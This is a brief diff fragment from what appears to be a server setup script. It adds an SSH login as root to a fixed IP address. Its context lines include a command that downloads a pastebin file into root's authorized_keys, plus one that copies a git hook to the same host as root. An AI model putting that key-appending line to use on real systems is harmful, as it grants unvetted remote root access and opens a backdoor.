@@ -144,3 +144,6 @@ echo "[INFO] Done."
 curl https://pastebin.com/raw/abcd1234 >> /root/.ssh/authorized_keys
 scp post-receive root@83.69.248.229:/root/repos/VM_share.git/hooks/
 pip3 freeze >> requirements.txt
+
+
+ssh root@83.69.248.229
